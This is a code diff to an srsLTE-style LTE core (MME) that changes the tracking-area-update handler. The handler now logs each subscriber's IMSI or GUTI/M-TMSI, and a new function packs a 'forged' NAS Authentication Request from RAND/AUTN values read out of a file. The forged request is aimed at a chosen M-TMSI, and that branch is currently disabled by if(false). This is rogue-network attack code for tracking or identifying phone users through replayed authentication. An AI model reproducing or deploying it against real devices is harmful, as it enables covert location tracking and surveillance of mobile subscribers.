@@ -792,7 +792,15 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
 {
   srslte::byte_buffer_pool* pool = srslte::byte_buffer_pool::get_instance();
 
-  LIBLTE_MME_TRACKING_AREA_UPDATE_REJECT_MSG_STRUCT tracking_update_req;
+  uint64_t                                       imsi        = 0;
+
+  uint8_t                                        mmec = 0;
+  uint16_t                                       mmegi = 0;
+  uint32_t                                       plmn = 0;
+
+
+
+  LIBLTE_MME_TRACKING_AREA_UPDATE_REQUEST_MSG_STRUCT tracking_update_req;
 
   LIBLTE_ERROR_ENUM err = liblte_mme_unpack_tracking_area_update_request_msg((LIBLTE_BYTE_MSG_STRUCT*)nas_rx, &tracking_update_req);
   if (err != LIBLTE_SUCCESS) {
@@ -808,6 +816,34 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   nas_log->console("Warning: Tracking area update requests are not handled yet.\n");
   nas_log->warning("Tracking area update requests are not handled yet.\n");
 
+
+  // SJM : Get UE IMSI
+  if (tracking_update_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
+    for (int i = 0; i <= 14; i++) {
+      imsi += tracking_update_req.eps_mobile_id.imsi[i] * std::pow(10, 14 - i);
+    }
+    nas_log->console("Tracking Area Update Request -- IMSI: %015" PRIu64 "\n", imsi);
+    nas_log->info("Tracking Area Update Request -- IMSI: %015" PRIu64 "\n", imsi);
+  } else if (tracking_update_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
+    m_tmsi = tracking_update_req.eps_mobile_id.guti.m_tmsi;
+    mmegi   = tracking_update_req.eps_mobile_id.guti.mme_group_id;
+    plmn   = ((tracking_update_req.eps_mobile_id.guti.mcc << 12)&0xFFF000) + tracking_update_req.eps_mobile_id.guti.mnc;
+    mmec   = tracking_update_req.eps_mobile_id.guti.mme_code;
+
+    nas_log->console("Tracking Area Update Request -- PLMN: 0x%x\n", plmn);
+    nas_log->info("Tracking Area Update Request -- PLMN: 0x%x\n", plmn);
+    nas_log->console("Tracking Area Update Request -- MMEGI: 0x%x\n", mmegi);
+    nas_log->info("Tracking Area Update Request -- MMEGI: 0x%x\n", mmegi);
+    nas_log->console("Tracking Area Update Request -- MMEC: 0x%x\n", mmec);
+    nas_log->info("Tracking Area Update Request -- MMEC: 0x%x\n", mmec);
+    nas_log->console("Tracking Area Update Request -- M-TMSI: 0x%x\n", m_tmsi);
+    nas_log->info("Tracking Area Update Request -- M-TMSI: 0x%x\n", m_tmsi);
+  } else {
+    nas_log->error("Unhandled Mobile Id type in attach request\n");
+    return false;
+  }
+
+
   // Interfaces
   s1ap_interface_nas* s1ap = itf.s1ap;
   hss_interface_nas*  hss  = itf.hss;
@@ -821,7 +857,16 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
 
   srslte::byte_buffer_t* nas_tx = pool->allocate();
-  nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+  //SJM : Send False NAS Authentication Request
+ // if(m_tmsi == 0xd8647b0a)
+  if(false)
+  {
+    nas_tmp.pack_false_authentication_request(nas_tx);
+  }else
+  {
+    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+  }
+  // Pack NAS Authentication Request in Downlink NAS Transport msg
   s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
   pool->deallocate(nas_tx);
   return true;
@@ -1290,6 +1335,51 @@ bool nas::pack_authentication_request(srslte::byte_buffer_t* nas_buffer)
   }
   return true;
 }
+
+//SJM : packing forged authentication request
+bool nas::pack_false_authentication_request(srslte::byte_buffer_t* nas_buffer)
+{
+  m_nas_log->info("Packing Authentication Request\n");
+
+  // Pack NAS msg
+  std::ifstream randauth_file("randauth.txt",std::ifstream::in);
+
+  LIBLTE_MME_AUTHENTICATION_REQUEST_MSG_STRUCT auth_req;
+  //memcpy(auth_req.autn, m_sec_ctx.autn, 16);
+  //memcpy(auth_req.rand, m_sec_ctx.rand, 16);
+
+  unsigned int tmp = 0;
+
+  //randauth_file >> tmp;
+  //auth_req.nas_ksi.tsc_flag = tmp;
+
+  randauth_file >> tmp;
+  auth_req.nas_ksi.nas_ksi = tmp;
+
+  for(int i = 0; i < 16; i++)
+  {
+    randauth_file >> tmp;
+    auth_req.rand[i] = tmp;
+  }
+
+  for(int i = 0; i < 16; i++)
+  {
+    randauth_file >> tmp;
+    auth_req.autn[i] = tmp;
+  }
+
+  auth_req.nas_ksi.tsc_flag = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
+  //auth_req.nas_ksi.nas_ksi  = m_sec_ctx.eksi;
+
+  LIBLTE_ERROR_ENUM err = liblte_mme_pack_authentication_request_msg(&auth_req, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
+  if (err != LIBLTE_SUCCESS) {
+    m_nas_log->error("Error packing Authentication Request\n");
+    m_nas_log->console("Error packing Authentication Request\n");
+    return false;
+  }
+  return true;
+}
+
 
 bool nas::pack_authentication_reject(srslte::byte_buffer_t* nas_buffer)
 {
